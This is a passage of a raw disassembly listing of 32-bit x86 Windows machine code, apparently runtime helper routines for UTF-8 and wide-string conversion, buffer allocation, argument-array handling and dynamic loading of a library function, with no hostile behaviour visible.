  404f3a:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  404f41:	00 
  404f42:	89 c3                	mov    %eax,%ebx
  404f44:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  404f4b:	00 
  404f4c:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  404f50:	89 44 24 10          	mov    %eax,0x10(%esp)
  404f54:	c7 44 24 0c ff ff ff 	movl   $0xffffffff,0xc(%esp)
  404f5b:	ff 
  404f5c:	89 74 24 08          	mov    %esi,0x8(%esp)
  404f60:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404f67:	00 
  404f68:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404f6f:	ff d7                	call   *%edi
  404f71:	83 ec 20             	sub    $0x20,%esp
  404f74:	85 c0                	test   %eax,%eax
  404f76:	74 2b                	je     0x404fa3
  404f78:	83 c4 2c             	add    $0x2c,%esp
  404f7b:	89 d8                	mov    %ebx,%eax
  404f7d:	5b                   	pop    %ebx
  404f7e:	5e                   	pop    %esi
  404f7f:	5f                   	pop    %edi
  404f80:	5d                   	pop    %ebp
  404f81:	c3                   	ret
  404f82:	e8 e9 fe ff ff       	call   0x404e70
  404f87:	c7 04 24 a4 d3 40 00 	movl   $0x40d3a4,(%esp)
  404f8e:	89 44 24 04          	mov    %eax,0x4(%esp)
  404f92:	31 db                	xor    %ebx,%ebx
  404f94:	e8 77 ce ff ff       	call   0x401e10
  404f99:	83 c4 2c             	add    $0x2c,%esp
  404f9c:	89 d8                	mov    %ebx,%eax
  404f9e:	5b                   	pop    %ebx
  404f9f:	5e                   	pop    %esi
  404fa0:	5f                   	pop    %edi
  404fa1:	5d                   	pop    %ebp
  404fa2:	c3                   	ret
  404fa3:	e8 c8 fe ff ff       	call   0x404e70
  404fa8:	c7 04 24 dc d3 40 00 	movl   $0x40d3dc,(%esp)
  404faf:	89 44 24 04          	mov    %eax,0x4(%esp)
  404fb3:	31 db                	xor    %ebx,%ebx
  404fb5:	e8 56 ce ff ff       	call   0x401e10
  404fba:	eb bc                	jmp    0x404f78
  404fbc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404fc0:	55                   	push   %ebp
  404fc1:	57                   	push   %edi
  404fc2:	31 ed                	xor    %ebp,%ebp
  404fc4:	56                   	push   %esi
  404fc5:	53                   	push   %ebx
  404fc6:	83 ec 2c             	sub    $0x2c,%esp
  404fc9:	8b 3d 5c f2 41 00    	mov    0x41f25c,%edi
  404fcf:	8b 74 24 40          	mov    0x40(%esp),%esi
  404fd3:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404fda:	00 
  404fdb:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404fe2:	00 
  404fe3:	89 34 24             	mov    %esi,(%esp)
  404fe6:	ff d7                	call   *%edi
  404fe8:	83 ec 0c             	sub    $0xc,%esp
  404feb:	85 c0                	test   %eax,%eax
  404fed:	89 c3                	mov    %eax,%ebx
  404fef:	75 1f                	jne    0x405010
  404ff1:	e8 7a fe ff ff       	call   0x404e70
  404ff6:	89 6c 24 40          	mov    %ebp,0x40(%esp)
  404ffa:	83 c4 2c             	add    $0x2c,%esp
  404ffd:	5b                   	pop    %ebx
  404ffe:	5e                   	pop    %esi
  404fff:	5f                   	pop    %edi
  405000:	5d                   	pop    %ebp
  405001:	e9 ca fe ff ff       	jmp    0x404ed0
  405006:	8d 76 00             	lea    0x0(%esi),%esi
  405009:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405010:	8d 44 00 01          	lea    0x1(%eax,%eax,1),%eax
  405014:	89 04 24             	mov    %eax,(%esp)
  405017:	e8 34 58 00 00       	call   0x40a850
  40501c:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  405020:	89 c5                	mov    %eax,%ebp
  405022:	89 44 24 04          	mov    %eax,0x4(%esp)
  405026:	89 34 24             	mov    %esi,(%esp)
  405029:	ff d7                	call   *%edi
  40502b:	83 ec 0c             	sub    $0xc,%esp
  40502e:	85 c0                	test   %eax,%eax
  405030:	75 0e                	jne    0x405040
  405032:	89 2c 24             	mov    %ebp,(%esp)
  405035:	e8 5e 58 00 00       	call   0x40a898
  40503a:	eb b5                	jmp    0x404ff1
  40503c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405040:	89 34 24             	mov    %esi,(%esp)
  405043:	e8 88 fe ff ff       	call   0x404ed0
  405048:	89 2c 24             	mov    %ebp,(%esp)
  40504b:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40504f:	e8 44 58 00 00       	call   0x40a898
  405054:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  405058:	85 c0                	test   %eax,%eax
  40505a:	74 95                	je     0x404ff1
  40505c:	83 c4 2c             	add    $0x2c,%esp
  40505f:	5b                   	pop    %ebx
  405060:	5e                   	pop    %esi
  405061:	5f                   	pop    %edi
  405062:	5d                   	pop    %ebp
  405063:	c3                   	ret
  405064:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40506a:	8d bf 00 00 00 00    	lea    0x0(%edi),%edi
  405070:	57                   	push   %edi
  405071:	56                   	push   %esi
  405072:	53                   	push   %ebx
  405073:	83 ec 20             	sub    $0x20,%esp
  405076:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  40507a:	8b 7c 24 34          	mov    0x34(%esp),%edi
  40507e:	8b 74 24 38          	mov    0x38(%esp),%esi
  405082:	85 db                	test   %ebx,%ebx
  405084:	74 4a                	je     0x4050d0
  405086:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  40508d:	00 
  40508e:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  405095:	00 
  405096:	89 74 24 14          	mov    %esi,0x14(%esp)
  40509a:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40509e:	c7 44 24 0c ff ff ff 	movl   $0xffffffff,0xc(%esp)
  4050a5:	ff 
  4050a6:	89 7c 24 08          	mov    %edi,0x8(%esp)
  4050aa:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4050b1:	00 
  4050b2:	c7 04 24 e9 fd 00 00 	movl   $0xfde9,(%esp)
  4050b9:	ff 15 b0 f2 41 00    	call   *0x41f2b0
  4050bf:	83 ec 20             	sub    $0x20,%esp
  4050c2:	85 c0                	test   %eax,%eax
  4050c4:	74 6a                	je     0x405130
  4050c6:	83 c4 20             	add    $0x20,%esp
  4050c9:	89 d8                	mov    %ebx,%eax
  4050cb:	5b                   	pop    %ebx
  4050cc:	5e                   	pop    %esi
  4050cd:	5f                   	pop    %edi
  4050ce:	c3                   	ret
  4050cf:	90                   	nop
  4050d0:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  4050d7:	00 
  4050d8:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4050df:	00 
  4050e0:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4050e7:	00 
  4050e8:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4050ef:	00 
  4050f0:	c7 44 24 0c ff ff ff 	movl   $0xffffffff,0xc(%esp)
  4050f7:	ff 
  4050f8:	89 7c 24 08          	mov    %edi,0x8(%esp)
  4050fc:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405103:	00 
  405104:	c7 04 24 e9 fd 00 00 	movl   $0xfde9,(%esp)
  40510b:	ff 15 b0 f2 41 00    	call   *0x41f2b0
  405111:	83 ec 20             	sub    $0x20,%esp
  405114:	85 c0                	test   %eax,%eax
  405116:	89 c6                	mov    %eax,%esi
  405118:	74 36                	je     0x405150
  40511a:	8d 40 01             	lea    0x1(%eax),%eax
  40511d:	89 04 24             	mov    %eax,(%esp)
  405120:	e8 2b 57 00 00       	call   0x40a850
  405125:	89 c3                	mov    %eax,%ebx
  405127:	e9 5a ff ff ff       	jmp    0x405086
  40512c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405130:	e8 3b fd ff ff       	call   0x404e70
  405135:	c7 04 24 54 d4 40 00 	movl   $0x40d454,(%esp)
  40513c:	89 44 24 04          	mov    %eax,0x4(%esp)
  405140:	31 db                	xor    %ebx,%ebx
  405142:	e8 c9 cc ff ff       	call   0x401e10
  405147:	e9 7a ff ff ff       	jmp    0x4050c6
  40514c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405150:	e8 1b fd ff ff       	call   0x404e70
  405155:	c7 04 24 18 d4 40 00 	movl   $0x40d418,(%esp)
  40515c:	89 44 24 04          	mov    %eax,0x4(%esp)
  405160:	e8 ab cc ff ff       	call   0x401e10
  405165:	e9 5c ff ff ff       	jmp    0x4050c6
  40516a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405170:	55                   	push   %ebp
  405171:	57                   	push   %edi
  405172:	31 ed                	xor    %ebp,%ebp
  405174:	56                   	push   %esi
  405175:	53                   	push   %ebx
  405176:	83 ec 2c             	sub    $0x2c,%esp
  405179:	8b 74 24 40          	mov    0x40(%esp),%esi
  40517d:	8b 7c 24 44          	mov    0x44(%esp),%edi
  405181:	8d 04 b5 04 00 00 00 	lea    0x4(,%esi,4),%eax
  405188:	89 04 24             	mov    %eax,(%esp)
  40518b:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40518f:	e8 bc 56 00 00       	call   0x40a850
  405194:	85 f6                	test   %esi,%esi
  405196:	89 c3                	mov    %eax,%ebx
  405198:	7f 0d                	jg     0x4051a7
  40519a:	eb 58                	jmp    0x4051f4
  40519c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4051a0:	83 c5 01             	add    $0x1,%ebp
  4051a3:	39 f5                	cmp    %esi,%ebp
  4051a5:	74 4d                	je     0x4051f4
  4051a7:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4051ae:	00 
  4051af:	8b 04 af             	mov    (%edi,%ebp,4),%eax
  4051b2:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4051b9:	89 44 24 04          	mov    %eax,0x4(%esp)
  4051bd:	e8 ae fe ff ff       	call   0x405070
  4051c2:	85 c0                	test   %eax,%eax
  4051c4:	89 04 ab             	mov    %eax,(%ebx,%ebp,4)
  4051c7:	75 d7                	jne    0x4051a0
  4051c9:	31 f6                	xor    %esi,%esi
  4051cb:	85 ed                	test   %ebp,%ebp
  4051cd:	78 13                	js     0x4051e2
  4051cf:	90                   	nop
  4051d0:	8b 04 b3             	mov    (%ebx,%esi,4),%eax
  4051d3:	83 c6 01             	add    $0x1,%esi
  4051d6:	89 04 24             	mov    %eax,(%esp)
  4051d9:	e8 ba 56 00 00       	call   0x40a898
  4051de:	39 ee                	cmp    %ebp,%esi
  4051e0:	7e ee                	jle    0x4051d0
  4051e2:	89 1c 24             	mov    %ebx,(%esp)
  4051e5:	e8 ae 56 00 00       	call   0x40a898
  4051ea:	83 c4 2c             	add    $0x2c,%esp
  4051ed:	31 c0                	xor    %eax,%eax
  4051ef:	5b                   	pop    %ebx
  4051f0:	5e                   	pop    %esi
  4051f1:	5f                   	pop    %edi
  4051f2:	5d                   	pop    %ebp
  4051f3:	c3                   	ret
  4051f4:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4051f8:	c7 44 03 fc 00 00 00 	movl   $0x0,-0x4(%ebx,%eax,1)
  4051ff:	00 
  405200:	83 c4 2c             	add    $0x2c,%esp
  405203:	89 d8                	mov    %ebx,%eax
  405205:	5b                   	pop    %ebx
  405206:	5e                   	pop    %esi
  405207:	5f                   	pop    %edi
  405208:	5d                   	pop    %ebp
  405209:	c3                   	ret
  40520a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405210:	57                   	push   %edi
  405211:	56                   	push   %esi
  405212:	53                   	push   %ebx
  405213:	83 ec 20             	sub    $0x20,%esp
  405216:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  40521a:	8b 7c 24 34          	mov    0x34(%esp),%edi
  40521e:	8b 74 24 38          	mov    0x38(%esp),%esi
  405222:	85 db                	test   %ebx,%ebx
  405224:	74 3a                	je     0x405260
  405226:	89 74 24 14          	mov    %esi,0x14(%esp)
  40522a:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40522e:	c7 44 24 0c ff ff ff 	movl   $0xffffffff,0xc(%esp)
  405235:	ff 
  405236:	89 7c 24 08          	mov    %edi,0x8(%esp)
  40523a:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405241:	00 
  405242:	c7 04 24 e9 fd 00 00 	movl   $0xfde9,(%esp)
  405249:	ff 15 80 f2 41 00    	call   *0x41f280
  40524f:	83 ec 18             	sub    $0x18,%esp
  405252:	85 c0                	test   %eax,%eax
  405254:	74 5a                	je     0x4052b0
  405256:	83 c4 20             	add    $0x20,%esp
  405259:	89 d8                	mov    %ebx,%eax
  40525b:	5b                   	pop    %ebx
  40525c:	5e                   	pop    %esi
  40525d:	5f                   	pop    %edi
  40525e:	c3                   	ret
  40525f:	90                   	nop
  405260:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  405267:	00 
  405268:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40526f:	00 
  405270:	c7 44 24 0c ff ff ff 	movl   $0xffffffff,0xc(%esp)
  405277:	ff 
  405278:	89 7c 24 08          	mov    %edi,0x8(%esp)
  40527c:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405283:	00 
  405284:	c7 04 24 e9 fd 00 00 	movl   $0xfde9,(%esp)
  40528b:	ff 15 80 f2 41 00    	call   *0x41f280
  405291:	83 ec 18             	sub    $0x18,%esp
  405294:	85 c0                	test   %eax,%eax
  405296:	89 c6                	mov    %eax,%esi
  405298:	74 36                	je     0x4052d0
  40529a:	8d 44 00 01          	lea    0x1(%eax,%eax,1),%eax
  40529e:	89 04 24             	mov    %eax,(%esp)
  4052a1:	e8 aa 55 00 00       	call   0x40a850
  4052a6:	89 c3                	mov    %eax,%ebx
  4052a8:	e9 79 ff ff ff       	jmp    0x405226
  4052ad:	8d 76 00             	lea    0x0(%esi),%esi
  4052b0:	e8 bb fb ff ff       	call   0x404e70
  4052b5:	c7 04 24 54 d4 40 00 	movl   $0x40d454,(%esp)
  4052bc:	89 44 24 04          	mov    %eax,0x4(%esp)
  4052c0:	31 db                	xor    %ebx,%ebx
  4052c2:	e8 49 cb ff ff       	call   0x401e10
  4052c7:	eb 8d                	jmp    0x405256
  4052c9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4052d0:	e8 9b fb ff ff       	call   0x404e70
  4052d5:	c7 04 24 18 d4 40 00 	movl   $0x40d418,(%esp)
  4052dc:	89 44 24 04          	mov    %eax,0x4(%esp)
  4052e0:	e8 2b cb ff ff       	call   0x401e10
  4052e5:	e9 6c ff ff ff       	jmp    0x405256
  4052ea:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4052f0:	55                   	push   %ebp
  4052f1:	57                   	push   %edi
  4052f2:	56                   	push   %esi
  4052f3:	53                   	push   %ebx
  4052f4:	83 ec 3c             	sub    $0x3c,%esp
  4052f7:	8b 44 24 50          	mov    0x50(%esp),%eax
  4052fb:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405302:	00 
  405303:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40530a:	89 44 24 04          	mov    %eax,0x4(%esp)
  40530e:	e8 fd fe ff ff       	call   0x405210
  405313:	c7 04 24 90 d4 40 00 	movl   $0x40d490,(%esp)
  40531a:	89 c5                	mov    %eax,%ebp
  40531c:	ff 15 78 f2 41 00    	call   *0x41f278
  405322:	83 ec 04             	sub    $0x4,%esp
  405325:	8b 1d 58 f2 41 00    	mov    0x41f258,%ebx
  40532b:	89 c6                	mov    %eax,%esi
  40532d:	c7 44 24 04 99 d4 40 	movl   $0x40d499,0x4(%esp)
  405334:	00 
  405335:	89 04 24             	mov    %eax,(%esp)
  405338:	ff d3                	call   *%ebx
  40533a:	83 ec 08             	sub    $0x8,%esp
  40533d:	89 c7                	mov    %eax,%edi
  40533f:	c7 44 24 04 a7 d4 40 	movl   $0x40d4a7,0x4(%esp)
  405346:	00 
  405347:	89 34 24             	mov    %esi,(%esp)
  40534a:	ff d3                	call   *%ebx
  40534c:	89 c3                	mov    %eax,%ebx
  40534e:	83 ec 08             	sub    $0x8,%esp
  405351:	31 c0                	xor    %eax,%eax
  405353:	85 db                	test   %ebx,%ebx
  405355:	74 6d                	je     0x4053c4
  405357:	85 ff                	test   %edi,%edi
  405359:	74 69                	je     0x4053c4
  40535b:	c7 44 04 10 00 00 00 	movl   $0x0,0x10(%esp,%eax,1)
  405362:	00 
  405363:	83 c0 04             	add    $0x4,%eax
  405366:	83 f8 20             	cmp    $0x20,%eax
  405369:	72 f0                	jb     0x40535b
  40536b:	8d 44 24 10          	lea    0x10(%esp),%eax
  40536f:	c7 44 24 10 20 00 00 	movl   $0x20,0x10(%esp)
  405376:	00 
  405377:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  40537b:	c7 44 24 14 10 00 00 	movl   $0x10,0x14(%esp)
  405382:	00 
  405383:	89 04 24             	mov    %eax,(%esp)
  405386:	ff d7                	call   *%edi
  405388:	83 ec 04             	sub    $0x4,%esp
  40538b:	89 c6                	mov    %eax,%esi
  40538d:	a3 04 b0 40 00       	mov    %eax,0x40b004
  405392:	89 2c 24             	mov    %ebp,(%esp)
  405395:	e8 fe 54 00 00       	call   0x40a898
  40539a:	83 fe ff             	cmp    $0xffffffff,%esi
  40539d:	74 14                	je     0x4053b3
  40539f:	c7 44 24 04 c0 e2 41 	movl   $0x41e2c0,0x4(%esp)
  4053a6:	00 
  4053a7:	89 34 24             	mov    %esi,(%esp)
  4053aa:	ff d3                	call   *%ebx
  4053ac:	83 ec 08             	sub    $0x8,%esp
  4053af:	85 c0                	test   %eax,%eax
  4053b1:	75 1d                	jne    0x4053d0
  4053b3:	c7 05 04 b0 40 00 ff 	movl   $0xffffffff,0x40b004
  4053ba:	ff ff ff 
  4053bd:	e8 ae fa ff ff       	call   0x404e70
  4053c2:	31 c0                	xor    %eax,%eax
  4053c4:	83 c4 3c             	add    $0x3c,%esp
  4053c7:	5b                   	pop    %ebx
  4053c8:	5e                   	pop    %esi
  4053c9:	5f                   	pop    %edi
  4053ca:	5d                   	pop    %ebp
  4053cb:	c3                   	ret
  4053cc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4053d0:	83 c4 3c             	add    $0x3c,%esp
  4053d3:	b8 01 00 00 00       	mov    $0x1,%eax
  4053d8:	5b                   	pop    %ebx
  4053d9:	5e                   	pop    %esi
  4053da:	5f                   	pop    %edi
  4053db:	5d                   	pop    %ebp
  4053dc:	c3                   	ret
  4053dd:	8d 76 00             	lea    0x0(%esi),%esi
  4053e0:	55                   	push   %ebp
  4053e1:	57                   	push   %edi
  4053e2:	31 ed                	xor    %ebp,%ebp
  4053e4:	56                   	push   %esi
  4053e5:	53                   	push   %ebx
  4053e6:	83 ec 2c             	sub    $0x2c,%esp
  4053e9:	8b 74 24 40          	mov    0x40(%esp),%esi
  4053ed:	8b 7c 24 44          	mov    0x44(%esp),%edi
  4053f1:	8d 04 b5 04 00 00 00 	lea    0x4(,%esi,4),%eax
  4053f8:	89 04 24             	mov    %eax,(%esp)
  4053fb:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4053ff:	e8 4c 54 00 00       	call   0x40a850
  405404:	85 f6                	test   %esi,%esi
  405406:	89 c3                	mov    %eax,%ebx
  405408:	7f 0d                	jg     0x405417
  40540a:	eb 58                	jmp    0x405464
  40540c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405410:	83 c5 01             	add    $0x1,%ebp
  405413:	39 f5                	cmp    %esi,%ebp
  405415:	74 4d                	je     0x405464
  405417:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40541e:	00 
  40541f:	8b 04 af             	mov    (%edi,%ebp,4),%eax
  405422:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405429:	89 44 24 04          	mov    %eax,0x4(%esp)
  40542d:	e8 de fd ff ff       	call   0x405210
  405432:	85 c0                	test   %eax,%eax
  405434:	89 04 ab             	mov    %eax,(%ebx,%ebp,4)
  405437:	75 d7                	jne    0x405410
  405439:	31 f6                	xor    %esi,%esi
  40543b:	85 ed                	test   %ebp,%ebp
  40543d:	78 13                	js     0x405452
  40543f:	90                   	nop
  405440:	8b 04 b3             	mov    (%ebx,%esi,4),%eax
  405443:	83 c6 01             	add    $0x1,%esi
  405446:	89 04 24             	mov    %eax,(%esp)
  405449:	e8 4a 54 00 00       	call   0x40a898
  40544e:	39 ee                	cmp    %ebp,%esi
  405450:	7e ee                	jle    0x405440
  405452:	89 1c 24             	mov    %ebx,(%esp)
  405455:	e8 3e 54 00 00       	call   0x40a898
  40545a:	83 c4 2c             	add    $0x2c,%esp
  40545d:	31 c0                	xor    %eax,%eax
  40545f:	5b                   	pop    %ebx
  405460:	5e                   	pop    %esi
  405461:	5f                   	pop    %edi
  405462:	5d                   	pop    %ebp
  405463:	c3                   	ret
  405464:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  405468:	c7 44 03 fc 00 00 00 	movl   $0x0,-0x4(%ebx,%eax,1)
  40546f:	00 
  405470:	83 c4 2c             	add    $0x2c,%esp
  405473:	89 d8                	mov    %ebx,%eax
  405475:	5b                   	pop    %ebx
  405476:	5e                   	pop    %esi
  405477:	5f                   	pop    %edi
  405478:	5d                   	pop    %ebp
  405479:	c3                   	ret
  40547a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405480:	57                   	push   %edi
  405481:	56                   	push   %esi
  405482:	53                   	push   %ebx
  405483:	83 ec 10             	sub    $0x10,%esp
  405486:	8b 44 24 24          	mov    0x24(%esp),%eax
  40548a:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405491:	00 
  405492:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405499:	8b 7c 24 20          	mov    0x20(%esp),%edi
  40549d:	89 44 24 04          	mov    %eax,0x4(%esp)
  4054a1:	e8 6a fd ff ff       	call   0x405210
  4054a6:	85 c0                	test   %eax,%eax
  4054a8:	89 c6                	mov    %eax,%esi
  4054aa:	74 54                	je     0x405500
  4054ac:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4054b0:	89 34 24             	mov    %esi,(%esp)
  4054b3:	85 c0                	test   %eax,%eax
  4054b5:	75 3e                	jne    0x4054f5
  4054b7:	e8 14 fa ff ff       	call   0x404ed0
  4054bc:	89 c3                	mov    %eax,%ebx
  4054be:	89 34 24             	mov    %esi,(%esp)
  4054c1:	e8 d2 53 00 00       	call   0x40a898
  4054c6:	85 db                	test   %ebx,%ebx
  4054c8:	74 36                	je     0x405500
  4054ca:	85 ff                	test   %edi,%edi
  4054cc:	74 1e                	je     0x4054ec
  4054ce:	8b 44 24 28          	mov    0x28(%esp),%eax
  4054d2:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4054d6:	89 3c 24             	mov    %edi,(%esp)
  4054d9:	89 44 24 08          	mov    %eax,0x8(%esp)
  4054dd:	e8 16 54 00 00       	call   0x40a8f8
  4054e2:	89 1c 24             	mov    %ebx,(%esp)
  4054e5:	89 fb                	mov    %edi,%ebx
  4054e7:	e8 ac 53 00 00       	call   0x40a898
  4054ec:	83 c4 10             	add    $0x10,%esp
  4054ef:	89 d8                	mov    %ebx,%eax
  4054f1:	5b                   	pop    %ebx
  4054f2:	5e                   	pop    %esi
  4054f3:	5f                   	pop    %edi
  4054f4:	c3                   	ret
  4054f5:	e8 c6 fa ff ff       	call   0x404fc0
  4054fa:	89 c3                	mov    %eax,%ebx
  4054fc:	eb c0                	jmp    0x4054be
  4054fe:	66 90                	xchg   %ax,%ax
  405500:	31 db                	xor    %ebx,%ebx
  405502:	eb e8                	jmp    0x4054ec
  405504:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40550a:	8d bf 00 00 00 00    	lea    0x0(%edi),%edi
  405510:	55                   	push   %ebp
  405511:	57                   	push   %edi
  405512:	b8 1c 20 00 00       	mov    $0x201c,%eax
  405517:	56                   	push   %esi
  405518:	53                   	push   %ebx
  405519:	e8 c2 50 00 00       	call   0x40a5e0
  40551e:	29 c4                	sub    %eax,%esp
  405520:	8b b4 24 34 20 00 00 	mov    0x2034(%esp),%esi
  405527:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40552e:	00 
  40552f:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405536:	00 
  405537:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40553e:	89 74 24 04          	mov    %esi,0x4(%esp)
  405542:	e8 39 ff ff ff       	call   0x405480
  405547:	85 c0                	test   %eax,%eax
  405549:	89 c3                	mov    %eax,%ebx
  40554b:	74 77                	je     0x4055c4
  40554d:	89 74 24 04          	mov    %esi,0x4(%esp)
  405551:	c7 44 24 0c 01 00 00 	movl   $0x1,0xc(%esp)
  405558:	00 
  405559:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405560:	00 
  405561:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405568:	e8 13 ff ff ff       	call   0x405480
  40556d:	85 c0                	test   %eax,%eax
  40556f:	89 c6                	mov    %eax,%esi
  405571:	74 5e                	je     0x4055d1
  405573:	8d 7c 24 10          	lea    0x10(%esp),%edi
  405577:	8d ac 24 10 10 00 00 	lea    0x1010(%esp),%ebp
  40557e:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  405582:	89 3c 24             	mov    %edi,(%esp)
  405585:	e8 76 d5 ff ff       	call   0x402b00
  40558a:	89 74 24 04          	mov    %esi,0x4(%esp)
  40558e:	89 2c 24             	mov    %ebp,(%esp)
  405591:	e8 fa d4 ff ff       	call   0x402a90
  405596:	8b 84 24 30 20 00 00 	mov    0x2030(%esp),%eax
  40559d:	89 7c 24 08          	mov    %edi,0x8(%esp)
  4055a1:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  4055a5:	89 04 24             	mov    %eax,(%esp)
  4055a8:	e8 b3 d5 ff ff       	call   0x402b60
  4055ad:	89 1c 24             	mov    %ebx,(%esp)
  4055b0:	e8 e3 52 00 00       	call   0x40a898
  4055b5:	89 34 24             	mov    %esi,(%esp)
  4055b8:	e8 db 52 00 00       	call   0x40a898
  4055bd:	8b 9c 24 30 20 00 00 	mov    0x2030(%esp),%ebx
  4055c4:	81 c4 1c 20 00 00    	add    $0x201c,%esp
  4055ca:	89 d8                	mov    %ebx,%eax
  4055cc:	5b                   	pop    %ebx
  4055cd:	5e                   	pop    %esi
  4055ce:	5f                   	pop    %edi
  4055cf:	5d                   	pop    %ebp
  4055d0:	c3                   	ret
  4055d1:	89 1c 24             	mov    %ebx,(%esp)
  4055d4:	31 db                	xor    %ebx,%ebx
  4055d6:	e8 bd 52 00 00       	call   0x40a898
  4055db:	eb e7                	jmp    0x4055c4
  4055dd:	8d 76 00             	lea    0x0(%esi),%esi
  4055e0:	83 ec 1c             	sub    $0x1c,%esp
  4055e3:	8b 44 24 28          	mov    0x28(%esp),%eax
  4055e7:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4055ee:	00 
  4055ef:	89 44 24 08          	mov    %eax,0x8(%esp)
  4055f3:	8b 44 24 24          	mov    0x24(%esp),%eax
  4055f7:	89 44 24 04          	mov    %eax,0x4(%esp)
  4055fb:	8b 44 24 20          	mov    0x20(%esp),%eax
  4055ff:	89 04 24             	mov    %eax,(%esp)
  405602:	e8 79 fe ff ff       	call   0x405480
  405607:	83 c4 1c             	add    $0x1c,%esp
  40560a:	c3                   	ret
  40560b:	90                   	nop
  40560c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405610:	83 ec 1c             	sub    $0x1c,%esp
  405613:	8b 44 24 28          	mov    0x28(%esp),%eax
  405617:	c7 44 24 0c 01 00 00 	movl   $0x1,0xc(%esp)
  40561e:	00 
  40561f:	89 44 24 08          	mov    %eax,0x8(%esp)
  405623:	8b 44 24 24          	mov    0x24(%esp),%eax
  405627:	89 44 24 04          	mov    %eax,0x4(%esp)
  40562b:	8b 44 24 20          	mov    0x20(%esp),%eax
  40562f:	89 04 24             	mov    %eax,(%esp)
  405632:	e8 49 fe ff ff       	call   0x405480
  405637:	83 c4 1c             	add    $0x1c,%esp
  40563a:	c3                   	ret
  40563b:	90                   	nop
  40563c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405640:	55                   	push   %ebp
  405641:	57                   	push   %edi
  405642:	31 ff                	xor    %edi,%edi
  405644:	56                   	push   %esi
  405645:	53                   	push   %ebx
  405646:	83 ec 2c             	sub    $0x2c,%esp
  405649:	8b 44 24 40          	mov    0x40(%esp),%eax
  40564d:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  405651:	8b 74 24 48          	mov    0x48(%esp),%esi
  405655:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  40565c:	89 04 24             	mov    %eax,(%esp)
  40565f:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  405663:	e8 e8 51 00 00       	call   0x40a850
  405668:	89 c3                	mov    %eax,%ebx
  40566a:	8b 44 24 40          	mov    0x40(%esp),%eax
  40566e:	85 c0                	test   %eax,%eax
  405670:	7f 0b                	jg     0x40567d
  405672:	eb 60                	jmp    0x4056d4
  405674:	83 c7 01             	add    $0x1,%edi
  405677:	3b 7c 24 40          	cmp    0x40(%esp),%edi
  40567b:	74 57                	je     0x4056d4
  40567d:	89 74 24 0c          	mov    %esi,0xc(%esp)
